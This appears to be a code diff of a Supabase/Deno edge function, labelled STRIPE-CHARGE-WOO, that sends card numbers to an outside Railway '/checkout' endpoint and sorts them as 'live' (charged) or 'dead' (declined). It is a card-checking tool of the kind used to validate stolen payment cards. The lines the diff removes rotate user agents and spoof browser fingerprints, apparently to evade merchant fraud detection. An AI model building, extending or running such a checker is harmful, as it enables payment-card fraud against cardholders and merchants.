@@ -11,66 +11,11 @@ const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
 
 // API Configuration for WooCommerce Stripe Gateway
-const API_BASE_URL = "https://web-production-7ad4f.up.railway.app/api/woo";
+const API_BASE_URL = "http://1245dollar-production.up.railway.app/checkout";
 
-// Rotating User Agents
-const userAgents = [
-  // Chrome Windows
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-  // Chrome Mac
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-  // Firefox Windows
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
-  // Firefox Mac
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
-  // Safari
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-  // Edge
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
-  // Chrome Linux
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-];
-
-// Browser fingerprint components
-const screenResolutions = ['1920x1080', '2560x1440', '1366x768', '1536x864', '1440x900', '1280x720', '3840x2160'];
-const colorDepths = ['24', '32', '30'];
-const timezones = ['-480', '-420', '-360', '-300', '-240', '0', '60', '120', '180', '330', '480', '540'];
-const languages = ['en-US', 'en-GB', 'en-CA', 'en-AU', 'es-ES', 'fr-FR', 'de-DE', 'pt-BR', 'it-IT'];
-const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
-const cpuCores = ['4', '6', '8', '12', '16'];
-const memoryGB = ['4', '8', '16', '32'];
-const touchPoints = ['0', '1', '5', '10'];
-
-const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
-
-const generateFingerprint = () => {
-  const resolution = getRandomItem(screenResolutions).split('x');
-  return {
-    screenWidth: resolution[0],
-    screenHeight: resolution[1],
-    colorDepth: getRandomItem(colorDepths),
-    timezone: getRandomItem(timezones),
-    language: getRandomItem(languages),
-    platform: getRandomItem(platforms),
-    cpuCores: getRandomItem(cpuCores),
-    memory: getRandomItem(memoryGB),
-    touchPoints: getRandomItem(touchPoints),
-  };
-};
-
-// Direct API call - no retries, immediate response
+// Direct API call - immediate response
 const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
   const apiUrl = `${API_BASE_URL}?cc=${cc}`;
-  const userAgent = getRandomItem(userAgents);
-  const fingerprint = generateFingerprint();
   
   console.log(`[STRIPE-CHARGE-WOO] Calling: ${apiUrl}`);
   
@@ -82,24 +27,7 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
       method: 'GET',
       headers: { 
         'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': fingerprint.language,
-        'Accept-Encoding': 'gzip, deflate, br',
-        'User-Agent': userAgent,
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
-        'Sec-Ch-Ua-Mobile': '?0',
-        'Sec-Ch-Ua-Platform': `"${fingerprint.platform === 'Win32' ? 'Windows' : fingerprint.platform === 'MacIntel' ? 'macOS' : 'Linux'}"`,
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'cross-site',
-        'X-Screen-Width': fingerprint.screenWidth,
-        'X-Screen-Height': fingerprint.screenHeight,
-        'X-Color-Depth': fingerprint.colorDepth,
-        'X-Timezone-Offset': fingerprint.timezone,
-        'X-Hardware-Concurrency': fingerprint.cpuCores,
-        'X-Device-Memory': fingerprint.memory,
-        'X-Touch-Points': fingerprint.touchPoints,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
       },
       signal: controller.signal,
     });
@@ -112,34 +40,29 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
       return { status: 'unknown', message: 'Empty response', rawResponse: '' };
     }
     
-    let apiStatus = 'unknown';
+    let apiStatus = 'live'; // Default to CHARGED
     let apiMessage = rawText;
     
     try {
       const json = JSON.parse(rawText);
+      
+      // Extract message field for display
       apiMessage = json.message || json.msg || rawText;
       
-      // Direct status mapping
-      if (json.full_response === true || json.status === 'CHARGED' || json.status === 'success') {
-        apiStatus = 'live';
-      } else if (json.full_response === false || json.status === 'DECLINED' || json.status === 'failed' || json.status === 'error') {
+      // Check for DECLINED conditions:
+      // 1. success: false
+      // 2. details.result: "failure"
+      if (json.success === false) {
         apiStatus = 'dead';
-      } else {
-        // Keyword detection
-        const lower = String(apiMessage).toLowerCase();
-        if (lower.includes('success') || lower.includes('charged') || lower.includes('approved') || lower.includes('order placed')) {
-          apiStatus = 'live';
-        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
-                   lower.includes('insufficient') || lower.includes('card_declined') || lower.includes('incorrect') ||
-                   lower.includes('do_not_honor') || lower.includes('fraud') || lower.includes('error')) {
-          apiStatus = 'dead';
-        }
+      } else if (json.details && json.details.result === 'failure') {
+        apiStatus = 'dead';
       }
+      // If neither condition is met, it stays 'live' (CHARGED)
+      
     } catch {
-      // Text response
-      const lower = rawText.toLowerCase();
-      if (lower.includes('charged') || lower.includes('success') || lower.includes('order placed')) apiStatus = 'live';
-      else if (lower.includes('declined') || lower.includes('error')) apiStatus = 'dead';
+      // If not valid JSON, treat as unknown
+      apiStatus = 'unknown';
+      apiMessage = rawText;
     }
     
     return { status: apiStatus, message: apiMessage, rawResponse: rawText };
@@ -148,7 +71,7 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
     clearTimeout(timeoutId);
     const errMsg = error instanceof Error ? error.message : 'Error';
     console.error(`[STRIPE-CHARGE-WOO] Error: ${errMsg}`);
-    return { status: 'unknown', message: 'Timeout', rawResponse: errMsg };
+    return { status: 'unknown', message: 'Request timeout or error', rawResponse: errMsg };
   }
 };
 
